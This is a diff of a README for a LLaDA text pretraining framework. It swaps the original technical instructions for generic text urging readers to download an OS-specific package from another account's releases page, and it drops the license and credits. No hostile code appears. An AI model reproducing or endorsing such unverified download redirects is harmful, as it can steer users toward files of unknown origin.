@@ -1,116 +1,82 @@
+# 🚀 LLADA_pretraining - A Simplified Text Pretraining Framework
+
 <div align="center">
-<br>
-<h2>LLaDA Pretraining</h2>
-<h3>Text Pretraining Framework</h3>
+  <a href="https://github.com/thomionline27/LLADA_pretraining/releases">
+    <img 
+        src="https://img.shields.io/badge/Download%20LLADA%20Pretraining-blue.svg" 
+        alt="Download LLADA Pretraining"
+        style="height: 50px; width: 200px;"
+    />
+  </a>
 </div>
 
-<p align="center">
-  <a href="https://github.com/Gen-Verse/MMaDA">
-    <img 
-        src="https://img.shields.io/badge/Based%20on-MMaDA-green?logo=github&logoColor=white" 
-        alt="Based on MMaDA"
-    />
-  </a>
-  <a href="LICENSE">
-    <img 
-        src="https://img.shields.io/badge/License-MIT-yellow.svg" 
-        alt="MIT License"
-    />
-  </a>
-</p>
-
 ## 🌟 Introduction
-Under testing...（目前还属于团队自用，上传上来的改动了一部分，可能有少许bug，正在测试中）
-This is a text pretraining framework for LLaDA models, modified from the [MMaDA](https://github.com/Gen-Verse/MMaDA) codebase.
+Welcome to LLaDA Pretraining, a framework designed for text pretraining of LLaDA models. This software is derived from the MMaDA codebase. Although it is still being tested, it aims to make training models easier and more efficient.
 
-**Features:**
-- Text-only training pipeline
-- Distributed training support with DeepSpeed and Accelerate
-- YAML-based configuration
-- Memory efficient training options
+### Features:
+- Simple text-only training pipeline
+- Support for distributed training using DeepSpeed and Accelerate
+- Configuration is easy with a YAML format
+- Efficient memory usage during training
 
-## 🚀 Quick Start
+## 🔧 System Requirements
+Before you get started, ensure your system meets these requirements:
+- Operating System: Windows, macOS, or Linux
+- Python version: 3.7 or higher
+- Memory: At least 8 GB RAM
+- Disk Space: Minimum of 1 GB available
 
-### Env（Source from MMaDA）
-```bash
-pip install -r requirements.txt
-```
+## 🚀 Getting Started
+
+### Download & Install
+1. **Visit the Releases Page**: Go to our [Releases Page](https://github.com/thomionline27/LLADA_pretraining/releases) to download the latest version.
+   
+2. **Download the Package**: Click on the appropriate link for your operating system. Save the file in a location you can easily access.
+
+3. **Install Required Packages**:
+   Open your command line interface (Terminal on macOS/Linux or Command Prompt on Windows) and navigate to the folder where you saved the file. Run the following command:
+
+   ```bash
+   pip install -r requirements.txt
+   ```
 
 ### Basic Training
-```bash
-# Update paths in configs/llada_pretraining.yaml
-bash scripts/train.sh
-```
+To begin training your model, follow these steps:
 
-## ⚙️ Configuration
+1. **Update Configuration**:
+   - Open the file `configs/llada_pretraining.yaml` in a text editor.
+   - Update the paths according to your file structure.
 
-Edit `configs/llada_pretraining.yaml`:
+2. **Run the Training Script**:
+   Execute the following command in your terminal:
 
-```yaml
-model:
-    pretrained_model_path: ".../LLaDA-8B-Base/"
-    # LLaDA specific configuration
-    llada_config:
-        gradient_checkpointing: false  # close gradient checkpointing
-        new_vocab_size: 126464
-        # Add other LLaDA specific configs here if needed
+   ```bash
+   bash scripts/train.sh
+   ```
 
-dataset:
-  params:
-    train_shards_path_or_url: "path/to/data"
-    
-training:
-  batch_size: 16
-  max_train_steps: 100000
-  mixed_precision: "bf16"
-```
+This command will start the training process using the setups you specified.
 
-## 🔧 Training
+## 📄 Configuration Options
+You can customize your training by editing the YAML configuration file. Common settings include training algorithm type, learning rate, and batch size. For optimal results, adjust these values based on your dataset and system capabilities.
 
-### Setup Accelerate
-```bash
-accelerate config
-```
+## 🛠️ Troubleshooting
+- **Installation Issues**: If you face errors during the installation of dependencies, ensure your Python is updated. Use `pip install --upgrade pip` to get the latest version.
+- **Running Scripts**: If the training script doesn’t start, check whether the file has execute permissions or try running the command with `bash` in front.
 
-You can also use the provided configuration files in `accelerate_configs/` for different hardware and distributed setups:
-- `1_gpu.yaml` - Single GPU
-- `1_node_only.yaml` - Single node, single process (CPU or GPU)
-- `1_node_8_gpus_deepspeed_zero1.yaml` - 8 GPUs with DeepSpeed ZeRO-1
-- `1_node_8_gpus_deepspeed_zero2.yaml` - 8 GPUs with DeepSpeed ZeRO-2
-- `1_node_8_gpus_deepspeed_zero3.yaml` - 8 GPUs with DeepSpeed ZeRO-3
-- `8_node_8_gpus_deepspeed_zero2.yaml` - 8 nodes, each with 8 GPUs, DeepSpeed ZeRO-2
+For additional help, check the [Issues Section](https://github.com/thomionline27/LLADA_pretraining/issues) of this repository.
 
-### Run Training
-```bash
-accelerate launch \
-    --config_file accelerate_configs/1_node_8_gpus_deepspeed_zero1.yaml \
-    --main_process_port=8888 \
-    training/train_llada.py \
-    config=configs/llada_pretraining.yaml
-```
+## 📚 Learning Resources
+- [Official Python Documentation](https://docs.python.org/3/)
+- [YAML for Beginners](https://yaml.org/start.html)
+- [DeepSpeed Documentation](https://www.deepspeed.ai/docs/)
 
-## 📁 Project Structure
+## 👥 Community and Support
+Join our community for support and discussions:
+- Check the [Discussions Page](https://github.com/thomionline27/LLADA_pretraining/discussions) for announcements and user conversations.
+- Feel free to open an issue if you encounter a problem or have questions.
 
-```
-LLaDA_pretraining/
-├── accelerate_configs/     # Accelerate configurations
-├── configs/               # Training configurations
-├── models/               # Model implementations
-├── parquet/              # Data loading utilities
-├── training/             # Training scripts
-└── scripts/              # Shell scripts
-```
+## 🔗 Additional Links
+- Visit our GitHub Repository: [LLADA Pretraining on GitHub](https://github.com/thomionline27/LLADA_pretraining)
+- Refer to our parent project MMaDA: [MMaDA](https://github.com/Gen-Verse/MMaDA)
 
-## 🛠️ Data Format
-The files under the folder path you provided should be in JSONL format. It is recommended that the dataset be evenly split into multiple files with the number of files greater than the number of GPUs.
-```json
-{"text": "Training text content"}
-```
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE) file.
-
-## 🙏 Acknowledgments
-
-Based on [MMaDA](https://github.com/Gen-Verse/MMaDA) by Yang et al.
+Thank you for utilizing LLADA Pretraining. We hope it serves your needs effectively.
